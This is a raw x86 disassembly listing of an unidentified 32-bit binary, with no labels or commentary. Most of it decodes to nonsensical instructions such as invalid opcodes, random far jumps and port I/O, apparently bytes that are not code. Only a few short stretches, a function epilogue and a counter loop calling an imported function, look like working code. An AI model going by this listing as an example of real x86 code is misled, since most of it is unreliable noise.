  405172:	aam    0xc6
  405174:	test   BYTE PTR [edx-0x725a5382],dl
  40517a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40517b:	mov    BYTE PTR [ebp+0x5a],dl
  40517e:	mov    fs,ebx
  405180:	dec    edi
  405181:	ja     0x405170
  405183:	xor    edx,DWORD PTR [eax-0x16cec435]
  405189:	outs   dx,BYTE PTR ds:[esi]
  40518a:	jno    0x405160
  40518c:	aaa    
  40518d:	in     eax,dx
  40518e:	call   0xcf15:0x2b272b8d
  405195:	cmp    dl,BYTE PTR ds:0x5da2339d
  40519b:	lods   eax,DWORD PTR ds:[esi]
  40519c:	ja     0x4051e7
  40519e:	lods   eax,DWORD PTR ds:[esi]
  40519f:	loope  0x405126
  4051a1:	xchg   edx,eax
  4051a2:	not    DWORD PTR [eax+0x75d35605]
  4051a8:	scas   eax,DWORD PTR es:[edi]
  4051a9:	xlat   BYTE PTR ds:[ebx]
  4051aa:	rol    DWORD PTR [esi-0x4a],0x72
  4051ae:	ffreep st(6)
  4051b0:	test   ebx,esi
  4051b2:	outs   dx,BYTE PTR ds:[esi]
  4051b3:	outs   dx,DWORD PTR ds:[esi]
  4051b4:	add    al,0xc3
  4051b6:	cmp    ch,BYTE PTR [edi]
  4051b8:	fisttp QWORD PTR [edx+0xc5d30a8]
  4051be:	loope  0x405209
  4051c0:	jmp    0x405233
  4051c2:	push   0xffffff92
  4051c4:	neg    DWORD PTR [ebx]
  4051c6:	cmp    BYTE PTR [ebp+esi*2+0x585d88fd],ch
  4051cd:	sbb    bl,bh
  4051cf:	scas   al,BYTE PTR es:[edi]
  4051d0:	fimul  DWORD PTR [edi+0x7a812054]
  4051d6:	adc    eax,0xa83e44ea
  4051db:	dec    ebp
  4051dc:	or     esi,ecx
  4051de:	dec    ecx
  4051df:	ins    DWORD PTR es:[edi],dx
  4051e0:	aad    0x4c
  4051e2:	inc    eax
  4051e3:	add    DWORD PTR [ebp+0x64],edi
  4051e6:	mov    cl,ch
  4051e8:	push   edi
  4051e9:	sub    dl,0x5c
  4051ec:	std    
  4051ed:	push   esi
  4051ee:	repnz mov dl,0xa5
  4051f1:	mov    ds:0x6a7bbd1,eax
  4051f6:	aad    0xa1
  4051f8:	cld    
  4051f9:	push   es
  4051fa:	sub    BYTE PTR [ecx+eax*8-0x7d],0xea
  4051ff:	mov    ebp,0x95a8f80c
  405204:	lea    eax,[eax+edx*1+0x32729a]
  40520b:	mov    DWORD PTR [ebp+0x8],eax
  40520e:	inc    DWORD PTR [ebp+0xc]
  405211:	jmp    0x404c37
  405216:	mov    eax,DWORD PTR [ebp-0x10]
  405219:	xor    eax,ecx
  40521b:	mov    ecx,DWORD PTR [ebp+0x10]
  40521e:	add    eax,esi
  405220:	mov    DWORD PTR [ecx],eax
  405222:	pop    esi
  405223:	leave  
  405224:	ret    0xc
  405227:	push   ebp
  405228:	mov    ebp,esp
  40522a:	jmp    0x4055fe
  40522f:	or     DWORD PTR ds:0x369d361d,0xffffffa3
  405236:	mov    ebp,0x424146fc
  40523b:	cld    
  40523c:	mov    esi,0x2ad0c508
  405241:	jl     0x4052bf
  405243:	mov    ch,0x79
  405245:	jl     0x4052c3
  405247:	inc    esi
  405248:	popa   
  405249:	aam    0x1b
  40524b:	pop    eax
  40524c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40524d:	mov    bh,0x3b
  40524f:	sti    
  405250:	jno    0x405258
  405252:	add    ecx,DWORD PTR [esi-0x75]
  405255:	xchg   esp,eax
  405256:	fsub   QWORD PTR [edx-0x79f0dd74]
  40525c:	ins    BYTE PTR es:[edi],dx
  40525d:	cli    
  40525e:	push   ds
  40525f:	lea    edx,[ecx]
  405261:	adc    al,0x64
  405263:	push   esi
  405264:	je     0x4052d0
  405266:	lds    edx,FWORD PTR [eax]
  405268:	jns    0x4052b1
  40526a:	dec    edi
  40526b:	dec    eax
  40526c:	add    eax,0xb8ea80b5
  405271:	lods   ax,WORD PTR ds:[esi]
  405273:	jmp    0x91f1975d
  405278:	xchg   esi,eax
  405279:	dec    edx
  40527a:	or     esp,ecx
  40527c:	clc    
  40527d:	pop    esp
  40527e:	xchg   bl,dh
  405280:	fcom   QWORD PTR [edi-0x512a366f]
  405286:	sub    al,0xaf
  405288:	lea    edx,[eax-0x1a7c891a]
  40528e:	mov    dh,0xf7
  405290:	xor    al,0x2
  405292:	cmc    
  405293:	jae    0x4052ff
  405295:	inc    edx
  405296:	mov    edx,0x2d721ba6
  40529b:	leave  
  40529c:	fisub  WORD PTR [ebx+0x6d]
  40529f:	retf   0x606b
  4052a2:	and    ch,BYTE PTR [ebx-0x4c513a74]
  4052a8:	gs mov esp,0xfd2c621e
  4052ae:	call   0xce3:0xd11df14a
  4052b5:	ds xchg esp,eax
  4052b7:	mov    ah,0x1f
  4052b9:	add    ecx,ebp
  4052bb:	pushf  
  4052bc:	push   edi
  4052bd:	mov    bl,0x59
  4052bf:	ss inc esp
  4052c1:	inc    eax
  4052c2:	push   ecx
  4052c3:	push   ebp
  4052c4:	or     DWORD PTR [edi],ebp
  4052c6:	push   eax
  4052c7:	xchg   esi,eax
  4052c8:	jle    0x4052c1
  4052ca:	inc    esp
  4052cb:	xor    al,0xa
  4052cd:	xchg   ecx,eax
  4052ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052cf:	xchg   edx,eax
  4052d0:	pop    edi
  4052d1:	push   edx
  4052d2:	jmp    0x279f:0x13a43eec
  4052d9:	adc    BYTE PTR ds:0x75827a0,cl
  4052df:	mov    ecx,0x33884964
  4052e4:	pop    es
  4052e5:	pop    edx
  4052e6:	fadd   DWORD PTR [edi-0x4d]
  4052e9:	push   ss
  4052ea:	scas   eax,DWORD PTR es:[edi]
  4052eb:	or     eax,0x31920b0e
  4052f0:	out    dx,eax
  4052f1:	push   ds
  4052f2:	cmp    esi,esp
  4052f4:	push   es
  4052f5:	add    DWORD PTR [ebp-0x1c],edi
  4052f8:	js     0x4052ba
  4052fa:	cmp    BYTE PTR ds:0xb34c38a5,bh
  405300:	xchg   edi,eax
  405301:	cmc    
  405302:	arpl   WORD PTR [ecx+0x4cb73c9],bp
  405308:	dec    edx
  405309:	inc    esp
  40530a:	push   0x5a9ea9d3
  40530f:	rcl    BYTE PTR [edx],0x1f
  405312:	adc    esi,DWORD PTR gs:[ebx+0x76]
  405316:	and    ebx,DWORD PTR [esp+edi*8-0x1135d20c]
  40531d:	ja     0x40537d
  40531f:	arpl   WORD PTR [edi-0x59],bx
  405322:	mov    edi,0xaf5b9d84
  405327:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405328:	pop    esp
  405329:	push   ss
  40532a:	ret    
  40532b:	jmp    0x40533f
  40532d:	pop    ebx
  40532e:	inc    edx
  40532f:	adc    eax,0x45dbdc9d
  405334:	mov    cl,0x60
  405336:	inc    ecx
  405337:	pop    edx
  405338:	gs push eax
  40533a:	pushf  
  40533b:	dec    esi
  40533c:	imul   ebx,edi,0xbf0bcba6
  405342:	pop    esi
  405343:	out    dx,eax
  405344:	push   ds
  405345:	sub    DWORD PTR [edx+0x78009d9e],esi
  40534b:	push   ds
  40534c:	retf   
  40534d:	jp     0x40539b
  40534f:	mov    edx,DWORD PTR [ebx]
  405351:	popa   
  405352:	jl     0x405312
  405354:	loopne 0x405324
  405356:	xor    al,0xfe
  405358:	call   0x14cb9701
  40535d:	xchg   esp,eax
  40535e:	shl    DWORD PTR ds:0x2654b23d,cl
  405364:	pop    esi
  405365:	sbb    DWORD PTR [edi+0x27],eax
  405368:	xchg   edx,eax
  405369:	dec    esi
  40536a:	arpl   sp,dx
  40536c:	jb     0x40537f
  40536e:	mov    esi,0x416bb1ae
  405373:	mov    DWORD PTR [eax+0x249e7e23],eax
  405379:	cs clc 
  40537b:	and    eax,ecx
  40537d:	adc    DWORD PTR [edx+0x21de8853],eax
  405383:	jns    0x40533d
  405385:	nop
  405386:	stos   DWORD PTR es:[edi],eax
  405387:	mov    ecx,ss
  405389:	inc    esi
  40538a:	mov    eax,ds:0x6c2a2927
  40538f:	test   al,0xae
  405391:	js     0x405348
  405393:	test   DWORD PTR [ecx-0x7272bfbd],esp
  405399:	aaa    
  40539a:	test   BYTE PTR [eax+0x380a95a8],bh
  4053a0:	ret    0xb859
  4053a3:	int3   
  4053a4:	scas   eax,DWORD PTR es:[edi]
  4053a5:	fcmovbe st,st(7)
  4053a7:	into   
  4053a8:	push   eax
  4053a9:	call   0xb9c70390
  4053ae:	shr    DWORD PTR [ecx],1
  4053b0:	ror    DWORD PTR [ebp+0x540b32c9],cl
  4053b6:	dec    edx
  4053b7:	mov    ecx,0x4471cef
  4053bc:	mov    ds:0x7f8ca1e6,eax
  4053c1:	dec    esp
  4053c2:	sbb    esp,ecx
  4053c4:	mov    ds:0xbb56187a,eax
  4053c9:	inc    edi
  4053ca:	xor    BYTE PTR [ecx],ah
  4053cc:	or     al,0x29
  4053ce:	mov    ds:0x4f09534,eax
  4053d3:	push   0x291993fc
  4053d8:	sub    al,0x95
  4053da:	and    ch,al
  4053dc:	imul   ecx,DWORD PTR [ebx-0x46cd3d4e],0xffffffaf
  4053e3:	ret    0xd6d0
  4053e6:	test   al,0x31
  4053e8:	jecxz  0x405433
  4053ea:	pop    edi
  4053eb:	jl     0x4053e3
  4053ed:	ret    0x2d11
  4053f0:	enter  0xa91b,0x44
  4053f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053f5:	sbb    eax,0x52559451
  4053fa:	outs   dx,BYTE PTR ds:[esi]
  4053fb:	nop
  4053fc:	popf   
  4053fd:	lods   al,BYTE PTR ds:[esi]
  4053fe:	mov    DWORD PTR [esi],ebx
  405400:	sbb    al,BYTE PTR [ebp+0x6e]
  405403:	adc    eax,0xf40066d1
  405408:	pop    ebx
  405409:	inc    ebp
  40540a:	ds pop eax
  40540c:	sbb    eax,0x2b78b8b1
  405411:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  405413:	adc    DWORD PTR [ecx+0x7c76145a],0xffffffca
  40541a:	cmc    
  40541b:	fsubr  st,st(5)
  40541d:	xor    al,0x59
  40541f:	js     0x40546c
  405421:	test   ch,ch
  405423:	popf   
  405424:	jp     0x405413
  405426:	push   ebx
  405427:	ins    DWORD PTR es:[edi],dx
  405428:	daa    
  405429:	jns    0x40548c
  40542b:	xchg   ebp,eax
  40542c:	xchg   BYTE PTR [ebp+0x78],cl
  40542f:	retf   
  405430:	push   es
  405431:	ja     0x405466
  405433:	mov    esp,0x78dd9728
  405438:	mov    ebp,0x9d136e0e
  40543d:	jb     0x405468
  40543f:	sbb    BYTE PTR [ecx-0xdd3caf1],al
  405445:	xchg   BYTE PTR [ecx],bl
  405447:	xchg   ebp,eax
  405448:	dec    eax
  405449:	dec    ebx
  40544a:	mov    edi,0x59a08c27
  40544f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405450:	push   edi
  405451:	test   DWORD PTR [ebx],edx
  405453:	(bad)  
  405454:	arpl   WORD PTR [ebp+0x61],bp
  405457:	cld    
  405458:	add    WORD PTR [edx-0x5eac800c],ax
  40545f:	push   esp
  405460:	push   ss
  405461:	int    0x22
  405463:	cmp    ah,al
  405465:	sbb    eax,0xb656fb48
  40546a:	pusha  
  40546b:	cwde   
  40546c:	mov    al,ds:0x4f1b38ee
  405471:	cmp    eax,0xb7d582dd
  405476:	dec    edx
  405477:	fsubr  st(0),st
  405479:	adc    al,0x41
  40547b:	jns    0x405425
  40547d:	add    al,0x5b
  40547f:	(bad)  
  405480:	loopne 0x405407
  405482:	jnp    0x405433
  405484:	jmp    0xedf6:0xe5220bfb
  40548b:	mov    dh,0x67
  40548d:	xor    eax,0x7443fed0
  405492:	add    ecx,ebx
  405494:	cmp    BYTE PTR [edx+0x4b90205c],0xaf
  40549b:	out    dx,al
  40549c:	sbb    al,0xd0
  40549e:	pusha  
  40549f:	fsubr  st(2),st
  4054a1:	or     edi,edi
  4054a3:	mov    esi,0xd752818a
  4054a8:	sbb    DWORD PTR [ebp+0x63],eax
  4054ab:	adc    ah,BYTE PTR [edx+0x43]
  4054ae:	fimul  DWORD PTR [edx]
  4054b0:	and    bh,BYTE PTR [esi+0x1b]
  4054b3:	into   
  4054b4:	mov    ebp,0xb48f47df
  4054b9:	scas   al,BYTE PTR es:[edi]
  4054ba:	mov    bh,0x87
  4054bc:	inc    edx
  4054bd:	ror    BYTE PTR [ebx+0x479afc09],cl
  4054c3:	in     al,0x5
  4054c5:	fcom   QWORD PTR [ecx-0x2d]
  4054c8:	cmp    al,0xb9
  4054ca:	ja     0x4054a0
  4054cc:	leave  
  4054cd:	mov    esp,DWORD PTR [eax-0x31]
  4054d0:	fisttp QWORD PTR [ecx-0x7b416dfe]
  4054d6:	pop    ebx
  4054d7:	sub    cl,bl
  4054d9:	sub    al,0x2c
  4054db:	aaa    
  4054dc:	(bad)  
  4054dd:	scas   eax,DWORD PTR es:[edi]
  4054de:	inc    edi
  4054df:	mov    WORD PTR [ebp+0x51],?
  4054e2:	mov    DWORD PTR [ebx],0xe89fd4bd
  4054e8:	ins    BYTE PTR es:[edi],dx
  4054e9:	fst    QWORD PTR [esi]
  4054eb:	pop    edx
  4054ec:	pushf  
  4054ed:	sbb    BYTE PTR [esi-0x13],cl
  4054f0:	mov    esp,0xf0c28ee1
  4054f5:	jmp    0x9631d582
  4054fa:	loop   0x4054aa
  4054fc:	adc    BYTE PTR [eax],bl
  4054fe:	push   0x3911a335
  405503:	push   ds
  405504:	sub    eax,0x242171ba
  405509:	lods   eax,DWORD PTR ds:[esi]
  40550a:	mov    al,ds:0x64ae4ac1
  40550f:	push   ebp
  405510:	outs   dx,BYTE PTR ds:[esi]
  405511:	mov    esp,0x786ab172
  405516:	rcr    BYTE PTR [edx-0x3a],1
  405519:	scas   eax,DWORD PTR es:[edi]
  40551a:	and    al,0x2f
  40551c:	push   eax
  40551d:	daa    
  40551e:	jo     0x4054b4
  405520:	neg    BYTE PTR [ecx]
  405522:	and    BYTE PTR [eax-0x4d33b1a4],ch
  405528:	test   ah,0xcc
  40552b:	outs   dx,DWORD PTR ds:[esi]
  40552c:	nop
  40552d:	stc    
  40552e:	pop    ebp
  40552f:	dec    ecx
  405530:	add    al,0x8e
  405532:	fidiv  WORD PTR [esi+0x6]
  405535:	dec    esp
  405536:	pop    ebx
  405537:	std    
  405538:	jno    0x40559a
  40553a:	dec    esp
  40553b:	mov    esi,0x2e51b3fe
  405540:	adc    cl,BYTE PTR [ecx+0x5f]
  405543:	jbe    0x405506
  405545:	nop
  405546:	xor    edi,esp
  405548:	sbb    eax,0x980c1ece
  40554d:	xlat   BYTE PTR ds:[ebx]
  40554e:	outs   dx,BYTE PTR ds:[esi]
  40554f:	xlat   BYTE PTR ds:[ebx]
  405550:	retf   
  405551:	dec    edx
  405552:	mov    eax,DWORD PTR [ecx]
  405554:	ins    DWORD PTR es:[edi],dx
  405555:	push   ebx
  405556:	xchg   ch,dh
  405558:	iret   
  405559:	cmp    esp,DWORD PTR ds:0x84c2cea
  40555f:	cwde   
  405560:	mov    eax,0xf5cafa1b
  405565:	mov    bh,0x46
  405567:	shr    DWORD PTR [esi+esi*8],1
  40556a:	aad    0x34
  40556c:	(bad)  
  40556d:	iret   
  40556e:	dec    ecx
  40556f:	add    BYTE PTR [edx+0x61],bh
  405572:	push   edi
  405573:	imul   eax,edi,0x57
  405576:	push   0x450f7902
  40557b:	sbb    eax,0x658a0db
  405580:	mov    dh,dh
  405582:	dec    ebp
  405583:	popf   
  405584:	sbb    cl,BYTE PTR [eax]
  405586:	push   es
  405587:	mov    ss,ecx
  405589:	xor    al,0xb8
  40558b:	inc    ebp
  40558c:	mov    ch,0x67
  40558e:	in     al,0x63
  405590:	mov    dh,0x27
  405592:	shr    al,0x3f
  405595:	cli    
  405596:	repz sahf 
  405598:	ins    DWORD PTR es:[edi],dx
  405599:	ja     0x405555
  40559b:	cmp    al,0x46
  40559d:	dec    edx
  40559e:	lock push cs
  4055a0:	or     al,0x71
  4055a2:	test   DWORD PTR [esi+eax*8+0x5753226b],edi
  4055a9:	inc    esp
  4055aa:	fst    QWORD PTR [ecx-0x760c8da2]
  4055b0:	sbb    bl,BYTE PTR [ebp-0x7ed9c51c]
  4055b6:	int    0x68
  4055b8:	sar    bl,0xb1
  4055bb:	push   0x5d9a8000
  4055c0:	jmp    0x2bd57fc1
  4055c5:	xchg   ebp,eax
  4055c6:	xchg   edx,eax
  4055c7:	cld    
  4055c8:	xchg   ebx,eax
  4055c9:	jge    0x405614
  4055cb:	cli    
  4055cc:	xchg   ebx,eax
  4055cd:	shr    BYTE PTR [edx-0x2e],0xd0
  4055d1:	add    eax,0x13ac4d78
  4055d6:	fucom  st(7)
  4055d8:	das    
  4055d9:	test   DWORD PTR [edi],0xa853b43a
  4055df:	lahf   
  4055e0:	xchg   ebp,eax
  4055e1:	stos   BYTE PTR es:[edi],al
  4055e2:	mov    edx,0xb933e28e
  4055e7:	inc    esi
  4055e8:	jbe    0x40561b
  4055ea:	or     eax,0x47b12d1b
  4055ef:	xlat   BYTE PTR ds:[ebx]
  4055f0:	push   ds
  4055f1:	mov    ds:0x29326088,eax
  4055f6:	fidivr DWORD PTR [edx+0x292bdd9b]
  4055fc:	imul   BYTE PTR [ecx+0x25815151]
  405602:	arpl   WORD PTR [esi],si
  405604:	inc    ebx
  405605:	add    BYTE PTR [eax],al
  405607:	add    BYTE PTR [eax],al
  405609:	add    BYTE PTR [ecx+0x433663],ah
  40560f:	inc    eax
  405610:	mov    ds:0x433663,eax
  405615:	cmp    DWORD PTR ds:0x433663,0x4
  40561c:	jne    0x405630
  405622:	push   0x6994
  405627:	push   DWORD PTR [ebp-0xc]
  40562a:	call   DWORD PTR ds:0x412254
  405630:	cmp    DWORD PTR ds:0x433663,0x3
  405637:	jne    0x405648
  40563d:	mov    eax,ds:0x433663
  405642:	inc    eax
  405643:	mov    ds:0x433663,eax
  405648:	cmp    DWORD PTR ds:0x433663,0x12
  40564f:	jb     0x40560a
  405655:	sbb    edx,ecx
  405657:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40565e:	jmp    0x405a32
  405663:	xchg   ecx,eax
  405664:	dec    ebx
  405665:	xor    eax,0xbd71fd91
  40566a:	dec    ebx
  40566b:	rcl    DWORD PTR [esi+0x1d],1
  40566e:	push   esi
  40566f:	pop    eax
  405670:	call   FWORD PTR [esi+ecx*8+0x7c7c3609]
  405677:	mov    ch,0x79
  405679:	jl     0x4056f7
  40567b:	jl     0x405687
  40567d:	call   0xce66414b
  405682:	mov    ss,WORD PTR ds:0xd8fb8c5a
  405688:	sub    DWORD PTR [ecx],0x2e611521
  40568e:	cmp    al,0x34
  405690:	test   DWORD PTR [ebx-0x27],0xf153512e
  405697:	repz jne 0x405633
  40569a:	test   eax,0x4dbc8461
  40569f:	sahf   
  4056a0:	repz fst DWORD PTR [ebp+ecx*4-0x21]
  4056a5:	adc    BYTE PTR [ecx],dh
  4056a7:	jmp    0x934e:0x5a031102
  4056ae:	jmp    0x4c8be49d
  4056b3:	adc    bh,cl
  4056b5:	xchg   bh,ah
  4056b7:	sti    
  4056b8:	add    BYTE PTR [edx+0x74],bl
  4056bb:	xchg   ecx,eax
  4056bc:	cmp    al,BYTE PTR [edi-0x3b055a60]
  4056c2:	ins    DWORD PTR es:[edi],dx
  4056c3:	pop    ecx
  4056c4:	rcr    DWORD PTR [esi+0x6c],1
  4056c7:	loopne 0x405702
  4056c9:	je     0x405695
  4056cb:	or     eax,0x7b71045e
  4056d0:	cmp    eax,0xebf6bfd6
  4056d5:	sbb    ch,BYTE PTR [edx]
  4056d7:	jae    0x4056e6
  4056d9:	sub    BYTE PTR [eax],al
  4056db:	fadd   st(6),st
  4056dd:	test   al,0x7
  4056df:	mov    WORD PTR [eax-0x3c],gs
  4056e2:	or     ecx,DWORD PTR [esi+0x1f00f1ed]
  4056e8:	adc    ecx,DWORD PTR ds:0x1e615a11
  4056ee:	test   eax,0x8ffbc48d
  4056f3:	sahf   
  4056f4:	add    eax,0xf72ba7a4
  4056f9:	ins    BYTE PTR es:[edi],dx
  4056fa:	sbb    cl,BYTE PTR [ecx+0x20]
  4056fd:	mov    al,0xe9
  4056ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405700:	or     dh,dl
  405702:	gs into 
  405704:	mov    ds:0xeb45424b,al
  405709:	shl    DWORD PTR [eax+0x1a],0x5a
  40570d:	sub    eax,0x3ae3ed49
  405712:	mov    ecx,0x2ea2b8f9
  405717:	xor    edi,esp
  405719:	xor    al,0xf3
  40571b:	inc    ecx
  40571c:	xchg   ebx,eax
  40571d:	mov    ecx,0xa8f63b12
  405722:	mov    bh,0x5f
  405724:	sub    al,BYTE PTR [esi-0x22]
  405727:	xchg   esi,eax
  405728:	xor    eax,esi
  40572a:	mov    ds:0xe1ffdcf6,eax
  40572f:	leave  
  405730:	out    0xcc,eax
  405732:	retf   
  405733:	mov    ecx,0xf3d44f7a
  405738:	adc    BYTE PTR [ebp+0x21b7bc98],0xeb
  40573f:	into   
  405740:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405741:	test   eax,0x3dbb0867
  405746:	sub    al,0xa8
  405748:	dec    edx
  405749:	xchg   ecx,eax
  40574a:	sar    DWORD PTR [ebx-0x7f],0xfc
  40574e:	adc    eax,0xc0efe3ee
  405753:	loop   0x405757
  405755:	iret   
  405756:	mov    BYTE PTR [ecx],dh
  405758:	inc    ebx
  405759:	ins    BYTE PTR es:[edi],dx
  40575a:	cdq    
  40575b:	outs   dx,DWORD PTR ds:[esi]
  40575c:	or     ah,BYTE PTR [edi+0x2e]
  40575f:	mov    esi,ecx
  405761:	fidivr DWORD PTR [eax+0xe]
  405764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405765:	rcr    BYTE PTR ds:0x3bad2680,0xb5
  40576c:	test   al,0x77
  40576e:	loope  0x40576b
  405770:	ror    DWORD PTR [eax],cl
  405772:	in     al,0xde
  405774:	(bad)  
  405775:	data16 fcomp QWORD PTR ds:0xd117bb
  40577c:	dec    edi
  40577d:	cmp    DWORD PTR [ebx],esp
  40577f:	xchg   ebp,eax
  405780:	aad    0xad
  405782:	jnp    0x405745
  405784:	adc    al,ah
  405786:	hlt    
  405787:	rcr    BYTE PTR [ecx+0x6b],1
  40578a:	(bad)  
  40578c:	stc    
  40578d:	mov    DWORD PTR [ebx+0x21],eax
  405790:	jp     0x405719
  405792:	stos   DWORD PTR es:[edi],eax
  405793:	mov    ds:0x4e7c2a4e,al
  405798:	inc    edx
  405799:	outs   dx,DWORD PTR ds:[esi]
  40579a:	cmp    BYTE PTR [eax-0x28],cl
  40579d:	mov    ecx,0x96bd0166
  4057a2:	popf   
  4057a3:	xchg   esi,eax
  4057a4:	xchg   ecx,eax
  4057a5:	frstor [eax+ebp*8]
  4057a8:	(bad)  
  4057a9:	mov    ebp,0x495bbe71
  4057ae:	push   edx
  4057af:	xchg   ch,al
  4057b1:	or     edx,DWORD PTR [esi]
  4057b3:	lods   eax,DWORD PTR ds:[esi]
  4057b4:	dec    ecx
  4057b5:	aam    0x8d
  4057b7:	mov    edi,0x946488db
  4057bc:	jne    0x40576d
  4057be:	and    ebp,DWORD PTR [ecx-0x4340458e]
  4057c4:	dec    esi
  4057c5:	xor    eax,0xae9b52ec
  4057ca:	fiadd  WORD PTR [eax-0x13]
  4057cd:	in     al,0xe4
  4057cf:	int3   
  4057d0:	pusha  
  4057d1:	(bad)  
  4057d3:	shl    BYTE PTR [esi],0xcf
  4057d6:	dec    ebx
  4057d7:	sar    BYTE PTR [eax-0x6fc86114],1
  4057dd:	xchg   esp,eax
  4057de:	ud0    edi,DWORD PTR [eax-0x6cc1f201]
  4057e5:	inc    edi
  4057e6:	pop    eax
  4057e7:	adc    BYTE PTR [eax],bl
  4057e9:	pop    esp
  4057ea:	lahf   
  4057eb:	xor    al,0xdf
  4057ed:	inc    esp
  4057ee:	xor    edx,DWORD PTR [eax+edx*4-0x2e81d22a]
  4057f5:	jmp    0x4057e2
  4057f7:	or     al,0x88
  4057f9:	xchg   esp,eax
  4057fa:	scas   al,BYTE PTR es:[edi]
  4057fb:	fld    TBYTE PTR [eax]
  4057fd:	cmp    eax,DWORD PTR ss:[eax]
  405800:	(bad)  
  405802:	cmp    DWORD PTR [eax],edi
  405804:	aad    0xc9
  405806:	inc    ecx
  405807:	lds    edi,FWORD PTR [edx+0x1d]
  40580a:	in     al,0x5f
  40580c:	loop   0x405806
  40580e:	bound  esp,QWORD PTR [eax+0xd49994]
  405814:	push   ss
  405815:	lock or BYTE PTR [ebx+0x153a6a1d],0x2b
  40581d:	cmp    DWORD PTR gs:[eax+edx*8+0x5e395922],edx
  405825:	dec    edx
  405826:	mov    WORD PTR [eax+0x3],?
  405829:	mov    dh,0x3c
  40582b:	js     0x4058a3
  40582d:	out    0x9b,al
  40582f:	into   
  405830:	or     DWORD PTR [ebx],ebp
  405832:	sti    
  405833:	pop    eax
  405834:	dec    edi
  405835:	out    0x52,al
  405837:	leave  
  405838:	inc    BYTE PTR [ebx+0x50]
  40583b:	sub    edx,DWORD PTR [ebp-0x70d94002]
  405841:	jge    0x405835
  405843:	pop    esi
  405844:	cmpxchg BYTE PTR [edi],ch
  405847:	xchg   ebx,eax
  405848:	ins    DWORD PTR es:[edi],dx
  405849:	in     eax,dx
  40584a:	fs cli 
  40584c:	mov    ds:0xc17026e9,al
  405851:	sbb    bl,cl
  405853:	push   ebp
  405854:	push   esi
  405855:	ror    DWORD PTR [eax-0x7a],cl
  405858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405859:	adc    eax,0xbf6cbe4a
  40585e:	ja     0x4057fd
  405860:	repz push cs
  405862:	mov    ecx,0xbc179f4c
  405867:	mov    edx,0x73148955
  40586c:	test   eax,0x304e55ab
  405871:	jmp    0xaa11:0x4788aee5
  405878:	cdq    
  405879:	rcl    BYTE PTR [eax],1
  40587b:	ror    DWORD PTR [eax+0x4575fb7a],1
  405881:	jmp    0xec9ed398
  405886:	adc    bl,dl
  405888:	(bad)  
  405889:	loopne 0x40587b
  40588b:	mov    DWORD PTR [edx],ecx
  40588d:	and    dh,BYTE PTR [ecx]
  40588f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405890:	xor    cl,BYTE PTR [edi]
  405892:	xchg   edx,edi
  405894:	ins    DWORD PTR es:[edi],dx
  405895:	pop    es
  405896:	xor    DWORD PTR [ecx-0x70eaa749],edx
  40589c:	rcl    BYTE PTR [ebp-0x6857717b],1
  4058a2:	or     DWORD PTR [esi-0x6157c491],esp
  4058a8:	jg     0x4058af
  4058aa:	repnz cmp eax,0xff41922b
  4058b0:	es push cs
  4058b2:	(bad)  
  4058b3:	popf   
  4058b4:	leave  
  4058b5:	cmp    BYTE PTR [edx+0x7224b84d],al
  4058bb:	push   edx
  4058bc:	ins    DWORD PTR es:[edi],dx
  4058bd:	mov    ebx,0x7967d6b0
  4058c2:	xchg   esi,eax
  4058c3:	jle    0x4058a4
  4058c5:	or     eax,0xffffffa3
  4058c8:	in     eax,dx
  4058c9:	fs mov edx,0x54fa9d29
  4058cf:	cwde   
  4058d0:	call   0x94aec551
  4058d5:	stos   DWORD PTR es:[edi],eax
  4058d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058d7:	inc    BYTE PTR [ecx+0x7d]
  4058da:	cld    
  4058db:	jecxz  0x40585d
  4058dd:	dec    ebp
  4058de:	cmp    dh,0x72
  4058e1:	fs fwait
  4058e3:	adc    eax,0x72a7ad1b
  4058e8:	mov    cl,0x7d
  4058ea:	inc    esi
  4058eb:	inc    esp
  4058ec:	pop    edx
  4058ed:	cli    
  4058ee:	(bad)  
  4058ef:	sti    
  4058f0:	xchg   DWORD PTR [ecx+0x1218c30b],ebx
  4058f6:	loope  0x4058f5
  4058f8:	int    0x55
  4058fa:	cld    
  4058fb:	push   esp
  4058fc:	mov    edi,0x6134adb9
  405901:	mov    ah,0x6
  405903:	sub    DWORD PTR gs:[ebx-0x22],eax
  405907:	xchg   ecx,eax
  405908:	adc    al,0xf1
  40590a:	jnp    0x405955
  40590c:	pop    esi
  40590d:	addr16 xchg dh,bl
  405910:	mov    edx,0x3b69e02f
  405915:	hlt    
  405916:	pop    edx
  405917:	sbb    DWORD PTR [esi+0x6eefd4de],edi
  40591d:	shl    DWORD PTR ds:0x3359ba36,1
  405923:	bound  esi,QWORD PTR [ebp+ebp*8-0x39]
  405927:	pop    eax
  405928:	and    bl,BYTE PTR [esi]
  40592a:	arpl   bx,bp
  40592c:	rol    BYTE PTR [esi+0x62],cl
  40592f:	push   0x6d
  405931:	cmp    ebp,DWORD PTR [ebx+0x35e329a3]
  405937:	pop    ds
  405938:	xchg   ecx,eax
  405939:	lds    esi,FWORD PTR [ebx-0x3c]
  40593c:	aaa    
  40593d:	mov    ds:0x250c44d7,al
  405942:	mov    ds:0xc8f36520,eax
  405947:	jnp    0x405948
  405949:	test   eax,0x7dfc2d08
  40594e:	pop    ebp
  40594f:	add    BYTE PTR [ebp+ebp*8-0x59e0a813],0x67
  405957:	xchg   esi,ebx
  405959:	in     al,dx
  40595a:	mov    esp,DWORD PTR [eax+0x6ae4d6]
  405960:	iret   
  405961:	cmp    al,0x5c
  405963:	arpl   WORD PTR [edx-0x214ed93e],bx
  405969:	pop    esi
  40596a:	sets   BYTE PTR [edi]
  40596d:	cdq    
  40596e:	adc    ah,al
  405970:	mov    al,ds:0xb35e0d04
  405975:	sahf   
  405976:	mov    ebx,0x2fcf778b
  40597b:	xchg   edx,eax
  40597c:	sbb    al,0xa6
